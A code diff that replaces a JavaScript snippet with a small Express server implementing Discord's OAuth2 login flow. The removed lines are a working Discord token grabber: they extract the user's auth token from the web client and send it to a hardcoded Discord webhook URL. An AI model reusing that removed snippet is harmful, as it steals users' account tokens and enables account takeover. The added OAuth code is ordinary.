@@ -1,29 +1,44 @@
-(function() {
-    'use strict';
+const express = require('express');
+const axios = require('axios');
+const dotenv = require('dotenv');
+dotenv.config();
 
-    const webhook = 'https://discord.com/api/webhooks/1408157196591825018/OXuCSkShIMn7GoJHszwVLS9i5ILtz-I1EfQrDsMQYrVjisDvgA0aneLbYiXjtOQ6EX1_';
+const app = express();
+const port = 3000;
 
-    var token = (webpackChunkdiscord_app.push([[''], {}, e => {
-        m = [];
-        for (let c in e.c) m.push(e.c[c]);
-    }]), m).find(m => m?.exports?.default?.getToken !== undefined).exports.default.getToken();
+const DISCORD_CLIENT_ID = process.env.DISCORD_CLIENT_ID;
+const DISCORD_CLIENT_SECRET = process.env.DISCORD_CLIENT_SECRET;
+const DISCORD_REDIRECT_URI = process.env.DISCORD_REDIRECT_URI;
 
-    console.log("Token:", token);
+app.get('/callback', async (req, res) => {
+  const code = req.query.code;  // The authorization code
 
-    if (token) {
-        fetch(webhook, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                content: `Token: ${token}`
-            })
-        })
-        .then(response => response.json())
-        .then(data => console.log('Success:', data))
-        .catch((error) => console.error('Error:', error));
-    } else {
-        console.log("Token not found or undefined.");
+  // Exchange the code for an access token
+  const tokenResponse = await axios.post('https://discord.com/api/oauth2/token', new URLSearchParams({
+    client_id: DISCORD_CLIENT_ID,
+    client_secret: DISCORD_CLIENT_SECRET,
+    code: code,
+    grant_type: 'authorization_code',
+    redirect_uri: DISCORD_REDIRECT_URI,
+    scope: 'identify'
+  }), {
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded'
     }
-})();
+  });
+
+  const accessToken = tokenResponse.data.access_token;
+
+  // Fetch the user's Discord info
+  const userResponse = await axios.get('https://discord.com/api/v10/users/@me', {
+    headers: {
+      Authorization: `Bearer ${accessToken}`,
+    }
+  });
+
+  res.send(`Hello ${userResponse.data.username}`);
+});
+
+app.listen(port, () => {
+  console.log(`Server running on http://localhost:${port}`);
+});
